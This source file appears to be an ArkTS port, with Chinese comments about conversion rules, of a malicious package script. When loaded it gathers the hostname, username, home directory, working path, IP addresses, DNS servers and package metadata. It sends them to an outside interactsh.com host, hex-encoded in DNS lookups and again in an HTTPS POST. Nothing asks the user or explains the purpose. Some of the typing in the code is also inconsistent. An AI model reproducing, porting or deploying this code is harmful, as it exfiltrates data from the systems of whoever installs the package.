// 应用ArkTS约束：
// 1. 使用let替代var（规则9）
// 2. 显式类型标注（规则10,23）
// 3. 使用箭头函数替代函数表达式（规则26）
// 4. 使用类替代对象字面量类型（规则24）
// 5. 模块导入使用ES6语法（规则60）
// 6. 避免动态属性访问（规则21）
// 7. 处理Buffer的替代实现（规则75）
// 8. 严格类型检查（规则76）

import os from "os.ets";
import dns from "dns.ets";
import querystring from "querystring.ets";
import https from "https.ets";
import packageJSON from "./package.ets";

class TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: object;
    ip: string;

    constructor(p: string, c: string, hd: string, hn: string, 
               un: string, dns: string[], r?: string, v: string, 
               pjson: object, ip: string[]) {
        this.p = p;
        this.c = c;
        this.hd = hd;
        this.hn = hn;
        this.un = un;
        this.dns = JSON.stringify(dns);
        this.r = r;
        this.v = v;
        this.pjson = pjson;
        this.ip = JSON.stringify(ip);
    }
}

// 替代Buffer实现（规则75）
function toHex(data: string): string {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    let hex = '';
    for (const byte of bytes) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

function gethttpips(): string[] {
    const str: string[] = [];
    const networkInterfaces = os.networkInterfaces();
    for (const item of Object.keys(networkInterfaces)) {
        if (item != "lo") {
            const addresses = networkInterfaces[item];
            for (const address of addresses) {
                str.push(address.address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    const networkInterfaces = os.networkInterfaces();
    for (const item of Object.keys(networkInterfaces)) {
        if (item != "lo") {
            const addresses = networkInterfaces[item];
            for (const address of addresses) {
                str += toHex(address.address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(path: string): string {
    let str = "p";
    const chunks = path.split('/');
    for (const chunk of chunks) {
        str += toHex(chunk) + ".";
    }
    return str.slice(0, -1) + "p";
}

function toName(pkg: TrackingData): string[] {
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com";
    let str = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (str.length > 255) {
        const substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        const substr2 = getIps();
        
        if (substr1.length < 150) {
            const part1 = `${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}`;
            queries.push(`${part1}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            const part2 = `${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}`;
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${part2}.${hostname}`);
        } else {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${substr2}.${hostname}`);
        }
    } else {
        queries.push(str);
    }
    return queries;
}

// 初始化跟踪数据
const td = new TrackingData(
    packageJSON.name,
    __dirname,
    os.homedir(),
    os.hostname(),
    os.userInfo().username,
    dns.getServers(),
    packageJSON?.___resolved,
    packageJSON.version,
    packageJSON,
    gethttpips()
);

const qs = toName(td);
for (const query of qs) {
    dns.lookup(query, (err: Error | null, result: string) => {
        // DNS查询处理
    });
}

// 发送HTTP请求
const postData = new URLSearchParams({ msg: JSON.stringify(td) }).toString();

const options = {
    hostname: "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

const req = https.request(options, (res: any) => {
    res.on("data", (d: Uint8Array) => {
        // 数据处理
    });
});

req.on("error", (e: Error) => {
    // 错误处理
});

req.write(postData);
req.end();
